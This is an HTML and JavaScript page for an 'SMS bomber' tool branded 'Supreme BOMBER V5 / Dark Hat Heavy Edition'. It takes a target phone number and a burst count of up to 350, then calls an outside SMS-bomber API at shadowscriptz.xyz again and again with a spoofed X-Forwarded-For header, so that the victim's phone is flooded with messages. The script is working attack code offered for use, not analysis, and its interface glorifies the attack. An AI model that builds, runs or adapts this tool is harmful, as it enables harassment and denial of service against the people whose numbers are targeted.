<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>MONARQUE BOMBER V5 | DARK HAT HEAVY EDITION</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            font-family: 'Orbitron', monospace;
            overflow-x: hidden;
        }

        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.05) 0px, rgba(255,0,0,0.05) 2px, transparent 2px, transparent 8px);
            pointer-events: none;
            z-index: 1;
        }

        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, transparent 50%, rgba(0,0,0,0.3) 50%);
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 2;
            opacity: 0.3;
        }

        .glow-orb {
            position: fixed;
            width: 70vw;
            height: 70vw;
            background: radial-gradient(circle, rgba(255,0,0,0.3) 0%, rgba(0,255,0,0) 75%);
            border-radius: 50%;
            filter: blur(100px);
            z-index: 0;
            pointer-events: none;
            animation: pulseOrb 6s infinite alternate;
        }
        .orb1 { top: -30vh; left: -30vw; background: radial-gradient(circle, rgba(255,0,0,0.4), transparent); }
        .orb2 { bottom: -30vh; right: -30vw; background: radial-gradient(circle, rgba(0,255,0,0.25), transparent); animation-duration: 9s; }

        @keyframes pulseOrb {
            0% { transform: scale(1); opacity: 0.4; }
            100% { transform: scale(1.3); opacity: 0.8; }
        }

        .main-card {
            position: relative;
            z-index: 20;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(16px);
            width: 100%;
            max-width: 550px;
            border-radius: 38px;
            padding: 32px 28px;
            border: 2px solid #ff0000;
            box-shadow: 0 0 45px rgba(255, 0, 0, 0.6), inset 0 0 20px rgba(255, 0, 0, 0.2);
            animation: neon-border-pulse 3s infinite ease-in-out;
            transition: 0.2s;
            text-align: center;
        }

        @keyframes neon-border-pulse {
            0%, 100% {
                border-color: #ff0000;
                box-shadow: 0 0 45px rgba(255, 0, 0, 0.6), inset 0 0 20px rgba(255, 0, 0, 0.2);
            }
            50% {
                border-color: #00ff66;
                box-shadow: 0 0 45px rgba(0, 255, 102, 0.6), inset 0 0 20px rgba(0, 255, 102, 0.2);
            }
        }

        .giga-header {
            margin-bottom: 20px;
            position: relative;
        }

        .danger-icon {
            font-size: 52px;
            color: #ff0000;
            filter: drop-shadow(0 0 12px #ff0000);
            animation: shakeIcon 0.6s infinite;
        }

        @keyframes shakeIcon {
            0% { transform: translate(0, 0);}
            25% { transform: translate(2px, -1px);}
            50% { transform: translate(-2px, 1px);}
            75% { transform: translate(1px, 2px);}
            100% { transform: translate(0,0);}
        }

        .ik-bomber-v5 {
            font-size: 48px;
            font-weight: 900;
            letter-spacing: 6px;
            background: linear-gradient(135deg, #ff0000, #ff6600, #00ff66);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 12px #ff0000;
            margin-top: 5px;
            word-break: keep-all;
            animation: text-glow 3s infinite ease-in-out;
        }

        @keyframes text-glow {
            0%, 100% { text-shadow: 0 0 12px rgba(255, 0, 0, 0.8); }
            50% { text-shadow: 0 0 12px rgba(0, 255, 102, 0.8); }
        }

        .version-badge {
            background: #ff0000;
            display: inline-block;
            padding: 4px 14px;
            border-radius: 80px;
            font-size: 11px;
            font-weight: bold;
            color: black;
            margin-top: -10px;
            letter-spacing: 2px;
            box-shadow: 0 0 10px #ff0000;
            animation: badge-pulse 2s infinite ease-in-out;
        }

        @keyframes badge-pulse {
            0%, 100% { box-shadow: 0 0 10px rgba(255, 0, 0, 0.8); }
            50% { box-shadow: 0 0 10px rgba(0, 255, 102, 0.8); }
        }

        .sub-warning {
            font-family: 'Share Tech Mono', monospace;
            color: #ff6666;
            font-size: 11px;
            margin-top: 8px;
            letter-spacing: 1px;
        }

        .input-group {
            margin-bottom: 28px;
            text-align: left;
        }

        .label-text {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 12px;
            font-weight: 800;
            color: #ff7799;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 12px;
        }

        .label-text i {
            font-size: 16px;
            color: #ff0000;
        }

        .input-field {
            width: 100%;
            background: #0a0a0a;
            border: 2px solid #333;
            padding: 16px 22px;
            border-radius: 50px;
            font-size: 16px;
            font-family: 'Share Tech Mono', monospace;
            font-weight: bold;
            color: #00ff66;
            outline: none;
            transition: 0.3s ease;
            box-shadow: inset 0 0 8px black;
        }

        .input-field:focus {
            border-color: #ff0000;
            box-shadow: 0 0 18px rgba(255, 0, 0, 0.5), inset 0 0 4px rgba(255, 0, 0, 0.2);
            background: #000000;
        }

        .intensity-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 14px;
        }

        .intensity-btn {
            background: #121212;
            border: 2px solid #ff0000;
            padding: 12px 8px;
            border-radius: 40px;
            font-weight: 900;
            font-size: 16px;
            font-family: 'Orbitron', monospace;
            cursor: pointer;
            transition: 0.3s ease;
            color: #ffaaaa;
            box-shadow: 0 0 4px rgba(255, 0, 0, 0.5);
            animation: btn-pulse 2s infinite ease-in-out;
        }

        @keyframes btn-pulse {
            0%, 100% { border-color: #ff0000; box-shadow: 0 0 4px rgba(255, 0, 0, 0.5); }
            50% { border-color: #00ff66; box-shadow: 0 0 4px rgba(0, 255, 102, 0.5); }
        }

        .intensity-btn.active {
            background: rgba(255, 0, 0, 0.2);
            border-color: #00ff66;
            color: #fff;
            text-shadow: 0 0 5px black;
            box-shadow: 0 0 25px rgba(0, 255, 102, 0.6);
            transform: scale(1.02);
        }

        .btn-start {
            width: 100%;
            background: linear-gradient(135deg, #ff0000, #cc0000);
            border: 2px solid #ff0000;
            padding: 20px;
            border-radius: 60px;
            font-weight: 900;
            font-size: 20px;
            letter-spacing: 4px;
            font-family: 'Orbitron', monospace;
            color: white;
            cursor: pointer;
            margin: 16px 0 24px;
            transition: 0.3s ease;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
            animation: start-pulse 2s infinite ease-in-out;
            text-transform: uppercase;
        }

        @keyframes start-pulse {
            0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.6); border-color: #ff0000; }
            50% { box-shadow: 0 0 20px rgba(0, 255, 102, 0.6); border-color: #00ff66; }
        }

        .btn-start:active {
            transform: translateY(3px);
            box-shadow: 0 0 35px rgba(255, 0, 0, 0.8);
        }

        .terminal {
            background: #020205;
            border-radius: 24px;
            padding: 18px;
            height: 160px;
            overflow-y: auto;
            font-family: 'Share Tech Mono', monospace;
            font-size: 12px;
            color: #00ff66;
            text-align: left;
            border-left: 6px solid #ff0000;
            box-shadow: inset 0 0 20px black, 0 0 14px rgba(255, 0, 0, 0.3);
            backdrop-filter: blur(4px);
            animation: terminal-glow 3s infinite ease-in-out;
        }

        @keyframes terminal-glow {
            0%, 100% { border-left-color: #ff0000; box-shadow: inset 0 0 20px black, 0 0 14px rgba(255, 0, 0, 0.3); }
            50% { border-left-color: #00ff66; box-shadow: inset 0 0 20px black, 0 0 14px rgba(0, 255, 102, 0.3); }
        }

        .terminal-line {
            margin-bottom: 7px;
            word-break: break-word;
            letter-spacing: 0.5px;
            text-shadow: 0 0 5px rgba(0, 255, 102, 0.5);
        }

        .footer-skull {
            font-size: 10px;
            margin-top: 18px;
            color: #ff0000;
            text-align: center;
            font-family: monospace;
            animation: footer-pulse 2s infinite ease-in-out;
        }

        @keyframes footer-pulse {
            0%, 100% { color: #ff0000; text-shadow: 0 0 5px rgba(255, 0, 0, 0.5); }
            50% { color: #00ff66; text-shadow: 0 0 5px rgba(0, 255, 102, 0.5); }
        }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #0a0a0a; }
        ::-webkit-scrollbar-thumb { background: #ff0000; border-radius: 10px; }

        @media (max-width: 500px) {
            .main-card { padding: 22px; }
            .ik-bomber-v5 { font-size: 34px; letter-spacing: 2px; }
        }
    </style>
</head>
<body>
<div class="glow-orb orb1"></div>
<div class="glow-orb orb2"></div>
<div class="scanline"></div>

<div class="main-card">
    <div class="giga-header">
        <div class="danger-icon"><i class="fas fa-skull-crossbones"></i></div>
        <div class="ik-bomber-v5">Supreme BOMBER V5</div>
        <div class="version-badge"><i class="fas fa-code-branch"></i> ANNIHILATION CORE</div>
        <div class="sub-warning"><i class="fas fa-radiation"></i> DARK HAT HEAVY EDITION // UNLEASH THE CHAOS</div>
    </div>

    <form id="bomberForm">
        <div class="input-group">
            <div class="label-text"><i class="fas fa-crosshairs"></i> TARGET PHONE</div>
            <input type="tel" id="phoneNumber" class="input-field" placeholder="509XXXXXXXXX | PK FORMAT" required>
        </div>

        <div class="input-group">
            <div class="label-text"><i class="fas fa-bomb"></i> BURST POWER</div>
            <div class="intensity-grid">
                <button type="button" class="intensity-btn active" onclick="setAmount(10, this)">10X</button>
                <button type="button" class="intensity-btn" onclick="setAmount(25, this)">25X</button>
                <button type="button" class="intensity-btn" onclick="setAmount(50, this)">50X</button>
                <button type="button" class="intensity-btn" onclick="setAmount(100, this)">100X</button>
                <button type="button" class="intensity-btn" onclick="setAmount(200, this)">200X</button>
                <button type="button" class="intensity-btn" onclick="setAmount(350, this)">350X</button>
            </div>
        </div>

        <input type="hidden" id="registerAmount" value="10">

        <div class="input-group">
            <div class="label-text"><i class="fas fa-hourglass-start"></i> STRIKE DELAY (SEC)</div>
            <input type="number" id="delaySeconds" class="input-field" value="1.0" step="0.2" min="0.7">
        </div>

        <button type="submit" class="btn-start" id="startButton"><i class="fas fa-fire"></i> DETONATE <i class="fas fa-skull"></i></button>

        <div class="terminal" id="terminal">
            <div class="terminal-line">💀 sprm BOMBER V5 LOADED</div>
            <div class="terminal-line">💀 HEAVY MODE: ACTIVE</div>
            <div class="terminal-line">💀 WAITING FOR TARGET...</div>
        </div>
    </form>

    <div class="footer-skull">
        <i class="fas fa-shield-alt"></i> Powered by Monarque
    </div>
</div>

<script>
    function logToTerminal(msg, type = 'info') {
        const terminal = document.getElementById('terminal');
        const newLine = document.createElement('div');
        newLine.className = 'terminal-line';
        const time = new Date().toLocaleTimeString();
        let icon = '💣';
        if (type === 'sent') icon = '📨';
        else if (type === 'success') icon = '✅';
        else if (type === 'error') icon = '❌';
        else if (type === 'target') icon = '🎯';
        else if (type === 'hit') icon = '🔥';
        else icon = '⚡';
        newLine.innerHTML = `[${time}] ${icon} ${msg}`;
        terminal.appendChild(newLine);
        terminal.scrollTop = terminal.scrollHeight;
        if (terminal.children.length > 90) terminal.removeChild(terminal.firstChild);
    }

    function setAmount(val, btn) {
        document.getElementById('registerAmount').value = val;
        const buttons = document.querySelectorAll('.intensity-btn');
        buttons.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        logToTerminal(`NUKE POWER SET TO ${val} MISSILES`, 'hit');
    }

    async function callAPI(phone, attempt = 1) {
        const maxRetries = 2;
        const url = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${encodeURIComponent(phone)}&v=ik_v5`;
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 9000);
            const response = await fetch(url, {
                method: 'GET',
                mode: 'no-cors',
                cache: 'no-store',
                headers: {
                    'User-Agent': 'IK-Bomber-V5/Heavy (Windows NT; DARKHAT)',
                    'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
                },
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            return { success: true, status: 200 };
        } catch (err) {
            if (attempt < maxRetries) {
                logToTerminal(`⚠️ RETRYING... (${attempt+1}/${maxRetries})`, 'error');
                await new Promise(r => setTimeout(r, 350));
                return callAPI(phone, attempt+1);
            }
            return { success: false, error: err.message || 'NETWORK_FAIL' };
        }
    }

    let bombingActive = false;
    const form = document.getElementById('bomberForm');
    const startBtn = document.getElementById('startButton');

    async function runBomber(phone, total, delaySec) {
        let successHits = 0;
        let failedHits = 0;
        for (let i = 0; i < total; i++) {
            if (!bombingActive) break;
            const begin = Date.now();
            const result = await callAPI(phone);
            const elapsed = Date.now() - begin;
            if (result.success) {
                successHits++;
                logToTerminal(`💥 SMOKE HIT [${i+1}/${total}] | +OK (${elapsed}ms)`, 'sent');
            } else {
                failedHits++;
                logToTerminal(`💀 HIT FAILED [${i+1}/${total}] | ${result.error || 'TIMEOUT'}`, 'error');
            }
            if (i < total - 1 && bombingActive) {
                let dynamicDelay = delaySec * 1000;
                if (dynamicDelay < 600) dynamicDelay = 700;
                await new Promise(r => setTimeout(r, dynamicDelay));
            }
        }
        if (bombingActive) {
            logToTerminal(`🎯 MISSION STATUS: SUCCESS:${successHits} FAIL:${failedHits} | TARGET NEUTRALIZED`, 'success');
            logToTerminal(`☠️ IK BOMBER V5 | NETRA STRIKE FINISHED`, 'target');
        } else {
            logToTerminal(`⏸️ KILL SWITCH ACTIVATED - OPERATION HALTED`, 'error');
        }
        bombingActive = false;
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        if (bombingActive) {
            logToTerminal(`⚠️ BOMBING IN PROGRESS! WAIT TILL COMPLETION.`, 'error');
            return;
        }
        let rawPhone = document.getElementById('phoneNumber').value.trim();
        if (rawPhone === "") {
            logToTerminal(`❌ NO TARGET! ENTER A PHONE NUMBER`, 'error');
            return;
        }
        let cleanPhone = rawPhone.replace(/\D/g, '');
        if (cleanPhone.length === 0) {
            logToTerminal(`❌ INVALID FORMAT! USE DIGITS + COUNTRY CODE`, 'error');
            return;
        }
        if (cleanPhone.length === 10 && cleanPhone.startsWith('3')) cleanPhone = '92' + cleanPhone;
        if (cleanPhone.length < 11) {
            logToTerminal(`❌ NUMBER TOO SHORT. USE LIKE 509xxxxxxxxx`, 'error');
            return;
        }
        const amountRaw = parseInt(document.getElementById('registerAmount').value);
        let finalAmount = Math.min(amountRaw, 500);
        if (amountRaw > 500) logToTerminal(`⚠️ MAX 500 BURST FOR STABILITY`, 'info');
        let delayVal = parseFloat(document.getElementById('delaySeconds').value);
        if (isNaN(delayVal) || delayVal < 0.6) delayVal = 1.0;
        
        startBtn.disabled = true;
        startBtn.innerHTML = '<i class="fas fa-radiation"></i> MASSACRE MODE <i class="fas fa-biohazard"></i>';
        logToTerminal(`================ 🔻 INITIATE HEAVY BOMB 🔻 ================`, 'target');
        logToTerminal(`🎯 TARGET LOCKED: ${cleanPhone}`, 'target');
        logToTerminal(`💣 BURST CAPACITY: ${finalAmount}x SMS`, 'hit');
        logToTerminal(`⏱️  FIRING DELAY: ${delayVal} sec`, 'hit');
        
        bombingActive = true;
        await runBomber(cleanPhone, finalAmount, delayVal);
        
        startBtn.disabled = false;
        startBtn.innerHTML = '<i class="fas fa-fire"></i> DETONATE <i class="fas fa-skull"></i>';
    });

    window.setAmount = setAmount;
    document.getElementById('registerAmount').value = 10;

    window.addEventListener('load', () => {
        setTimeout(() => {
            logToTerminal('🔥 IK BOMBER V5 | HEAVY DARK HAT READY', 'success');
            logToTerminal('👑 KING MODE | SYSTEM ONLINE', 'info');
        }, 300);
    });
</script>
</body>
</html>
